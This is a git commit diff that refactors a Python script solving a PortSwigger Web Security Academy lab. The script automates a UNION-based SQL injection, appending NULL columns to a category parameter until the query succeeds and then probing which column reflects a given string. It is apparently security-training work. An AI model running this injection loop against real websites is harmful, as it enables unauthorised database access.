c3fb25e626df6e44bf402b2f9cf4127a4e71c3d2
Fauxsys <soseccon@gmail.com>
2020-04-30 23:49:17 -0400

    Implement OOP

--- sqli_union_lab_2.py
+++ sqli_union_lab_2.py
@@ -1,114 +1,108 @@
 #!/usr/bin/env python3
 import requests
+from requests_html import HTMLSession
+from dataclasses import dataclass, field
 import sys
-from bs4 import BeautifulSoup
-import re
-
-# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
-
-# API Parameters
-url = 'https://abcd.web-security-academy.net/'
-url = f'{url}page'
-params = {'category': 'Lifestyle'}
-null = ["'UNION SELECT", 'NULL', '--']
-sqli = {'category': f"Lifestyle{' '.join(null)}"}
-
-# API Request
-api_session = requests.Session()
-response = api_session.get(url, params=params)
-
-if response.status_code == 404:
-    sys.exit('The session you are looking for has expired')
 
 
-def sqli_union_lab_1(null, sqli):
+# Disable warnings generated due to unverified SSL connections
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+"""
+Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided.
+"""
+
+
+def validate(response):
     """
-    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
-    :param null: Copy of global null variable
-    :param sqli: Copy of global sqli variable
+    Validate Response Objects
+
+    :param response: The Response object, which contains a server’s response to an HTTP request.
     :return:
     """
-    # Perform a new requests with sqli parameters
-    lab1 = api_session.get(url, params=sqli)
+    try:
+        response.raise_for_status()
+    except requests.exceptions.HTTPError:
+        if response.status_code == 404:
+            help_msg = 'The session you are looking for has expired.'
+            sys.exit(f'{response.status_code}: {response.reason}. {help_msg}')
+    except requests.exceptions.ConnectionError as error:
+        help_msg = 'Please make sure you are using a valid URL.'
+        sys.exit(f'{help_msg}\n{error}')
+    except requests.exceptions.Timeout:
+        help_msg = 'Request timed out. This may be due to using an outdated lab URL.'
+        sys.exit(f'{help_msg}')
+    except requests.exceptions.RequestException as error:
+        help_msg = 'Caught general exception:'
+        sys.exit(f'{help_msg} {error}')
 
-    while not lab1.ok:
-        # Remove '--' then add ', NULL --' until lab1.ok is True
-        null.remove('--')
-        null.extend([',', 'NULL', '--'])
 
-        # Perform a new request with the updated list
-        sqli['category'] = f"Lifestyle{' '.join(null)}"
-        lab1 = api_session.get(url, params=sqli)
+@dataclass()
+class Injection:
+    lab_url: str = field()
+    parameters: dict = field(default_factory=dict)
+    session: requests.Session = field(default=requests.Session())
+    null: list = field(default_factory=list)
 
-    print(f"There are {null.count('NULL')} columns")
+    def __post_init__(self):
+        self.lab_url = f'{self.lab_url}filter' if self.lab_url.endswith('/') else f'{self.lab_url}/filter'
+        self.null = ["'UNION SELECT", 'NULL', '--']
+        self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
 
-    # Return null since it now has the amount of NULL's required to exploit the application
-    return null
+    def null_logic(self):
+        response = self.session.get(url=self.lab_url, params=self.parameters, timeout=5)
+        validate(response=response)
 
+        while not response.ok:
+            # Remove '--' then add ', NULL --' until response.ok is True
+            self.null.remove('--')
+            self.null.extend([',', 'NULL', '--'])
+            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
+            response = self.session.get(url=self.lab_url, params=self.parameters)
 
-def sqli_union_lab_2(lab2, null, sqli):
-    """
-    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value
-    provided.
-    :param lab2: Global response variable
-    :param null: Copy of global null variable
-    :param sqli: Copy of global sqli variable
-    :return:
-    """
-    # Parse the HTML output using Beautiful Soup to grab the secret value
-    html = BeautifulSoup(lab2.text, 'html.parser')
-    secret_string = html.find('p', {'id': 'hint'}).contents[0]
-    secret_value = re.search("['].*[']", secret_string)
+        print(f"There are {self.null.count('NULL')} columns.")
 
-    # Perform a new request with sqli parameters
-    lab2 = api_session.get(url, params=sqli)
-    # Initialize column variable for accurate column count
-    column = 1
-    # Retrieve the location of the first 'NULL'
-    step = null.index('NULL')
+    def secret_logic(self):
+        # Perform a new request
+        self.session = HTMLSession()
+        response = self.session.get(url=self.lab_url, params=self.parameters)
 
-    while not lab2.ok:
-        # Replace each NULL with the secret_value until lab2.ok is True.
-        index = null.index('NULL', step)
-        null[index] = secret_value[0]
+        try:
+            secret = response.html.search("Make the database retrieve the string: '{}'")[0]
+            # The quotation marks need to be inserted into the query also
+            secret = f"'{secret}'"
+        except TypeError:
+            # If secret could not be found, it must be because the lab has already been completed
+            sys.exit(response.html.find('#notification-labsolved > div > h4', first=True).text)
 
-        # Perform a new request with the updated parameters
-        sqli['category'] = f"Lifestyle{' '.join(null)}"
-        lab2 = api_session.get(url, params=sqli)
+        # Initialize column variable for accurate column count
+        column = 1
 
-        if not lab2.ok:
-            # Replace the secret_value with NULL if lab2.ok is still False
-            null[index] = "NULL"
-            # Increase step by 1 to find the next NULL
-            step = (index + 1)
-            # Increase column by 1 for accurate column count
-            column += 1
-    print(f'Column {column} contains inserted text')
+        # Find all indexes where the value is NULL
+        only_null = (index for index, value in enumerate(self.null) if value == 'NULL')
 
-    # Return the index where the secret value appeared within the query results
-    return index
+        for index in only_null:
+            self.null[index] = secret
+            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
+            response = self.session.get(url=self.lab_url, params=self.parameters)
 
-    ### ALTERNATIVE TO WHILE LOOP ###
-    # # Find all indexes where the value is NULL
-    # only_null = [index for index, value in enumerate(null) if value == 'NULL']
-    #
-    # for index in only_null:
-    #     while not lab2.ok:
-    #         null[index] = secret_value[0]
-    #         sqli['category'] = f"Lifestyle{' '.join(null)}"
-    #         lab2 = api_session.get(url, params=sqli)
-    #
-    #         if not lab2.ok:
-    #             null[index] = "NULL"
-    #             column += 1
-    #         break
-    # else:
-    #     print(f'Column {column} contains inserted text')
-    #
-    # # Return the index where the secret value appeared within the query results
-    # return null.index(secret_value[0])
+            if response.html.find('#notification-labsolved'):
+                break
+            else:
+                self.null[index] = "NULL"
+                column += 1
+                continue
+
+        print(f'Column {column} contains inserted text')
+
+        # Return the index where the secret value appeared within the query results
+        return self.null.index(secret)
 
 
 if __name__ == '__main__':
-    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())
-    index = sqli_union_lab_2(lab2=response, null=null.copy(), sqli=sqli.copy())
+    lab_url = 'https://abcd.web-security-academy.net/'
+
+    sqli = Injection(lab_url=lab_url)
+    sqli.null_logic()
+    sqli.secret_logic()
